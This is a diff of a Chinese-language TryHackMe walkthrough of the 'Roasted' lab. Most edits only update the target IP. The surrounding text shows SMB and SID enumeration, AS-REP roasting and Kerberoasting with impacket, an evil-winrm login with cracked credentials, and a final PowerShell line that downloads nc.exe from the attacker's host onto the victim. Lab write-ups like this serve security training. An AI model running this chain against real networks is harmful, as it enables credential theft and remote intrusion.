@@ -6,14 +6,14 @@
 
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
-└─# nmap -sV -Pn 10.10.44.7 -p-
+└─# nmap -sV -Pn 10.10.73.56 -p-
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-18 01:20 EST
 Stats: 0:07:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 Service scan Timing: About 70.00% done; ETC: 01:29 (0:00:15 remaining)
 Stats: 0:07:58 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 Service scan Timing: About 70.00% done; ETC: 01:29 (0:00:18 remaining)
-Nmap scan report for 10.10.44.7
+Nmap scan report for 10.10.73.56
 Host is up (0.31s latency).
 Not shown: 65515 filtered ports
 PORT      STATE SERVICE       VERSION
@@ -52,8 +52,8 @@ enum4linux枚举没有发现
 
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
-└─# smbmap -H 10.10.44.7 -u anonymous                                                                                                                                                                                                  1 ⨯
-[+] Guest session       IP: 10.10.44.7:445     Name: 10.10.44.7                                       
+└─# smbmap -H 10.10.73.56 -u anonymous                                                                                                                                                                                                  1 ⨯
+[+] Guest session       IP: 10.10.73.56:445     Name: 10.10.73.56                                       
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         ADMIN$                                                  NO ACCESS       Remote Admin
@@ -69,7 +69,7 @@ enum4linux枚举没有发现
 VulnNet-Business-Anonymous
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
-└─# smbclient  //10.10.44.7/VulnNet-Business-Anonymous                                                                                                                                                                                 1 ⨯
+└─# smbclient  //10.10.73.56/VulnNet-Business-Anonymous                                                                                                                                                                                 1 ⨯
 Enter WORKGROUP\root's password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -86,7 +86,7 @@ smb: \> ls
 VulnNet-Enterprise-Anonymous 
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
-└─# smbclient  //10.10.44.7/VulnNet-Enterprise-Anonymous                                                                                                                                                                             130 ⨯
+└─# smbclient  //10.10.73.56/VulnNet-Enterprise-Anonymous                                                                                                                                                                             130 ⨯
 Enter WORKGROUP\root's password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -102,12 +102,12 @@ smb: \> ls
 
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
-└─# python3 /opt/impacket/examples/lookupsid.py anonymous@10.10.44.7
+└─# python3 /opt/impacket/examples/lookupsid.py anonymous@10.10.73.56
 Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation
 
 Password:
-[*] Brute forcing SIDs at 10.10.44.7
-[*] StringBinding ncacn_np:10.10.44.7[\pipe\lsarpc]
+[*] Brute forcing SIDs at 10.10.73.56
+[*] StringBinding ncacn_np:10.10.73.56[\pipe\lsarpc]
 [*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
 498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
 500: VULNNET-RST\Administrator (SidTypeUser)
@@ -161,7 +161,7 @@ j-leet
 
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
-└─# python3 /opt/impacket/examples/GetNPUsers.py 'VULNNET-RST/' -usersfile user.txt -no-pass -dc-ip 10.10.44.7 
+└─# python3 /opt/impacket/examples/GetNPUsers.py 'VULNNET-RST/' -usersfile user.txt -no-pass -dc-ip 10.10.73.56 
 Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation
 
 [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
@@ -225,7 +225,7 @@ Session completed
 用上面的密码导出keberoast的哈希到```keberoast.hash```:
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
-└─# python3 /opt/impacket/examples/GetUserSPNs.py 'VULNNET-RST.local/t-skid:tj072889*' -outputfile keberoast.hash -dc-ip 10.10.44.7
+└─# python3 /opt/impacket/examples/GetUserSPNs.py 'VULNNET-RST.local/t-skid:tj072889*' -outputfile keberoast.hash -dc-ip 10.10.73.56
 
 Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation
 
@@ -283,7 +283,7 @@ Session completed
 
 ```
 ┌──(root💀kali)-[~/tryhackme/Roasted]
-└─# evil-winrm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -i 10.10.44.7
+└─# evil-winrm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -i 10.10.73.56
 
 Evil-WinRM shell v3.2
 
@@ -324,4 +324,4 @@ Mode                LastWriteTime         Length Name
 
 
 
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/winPEASx64.exe','C:\Users\enterprise-core-vn\Desktop\winPEASx64.exe')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/nc.exe','C:\Users\enterprise-core-vn\Desktop\nc.exe')"
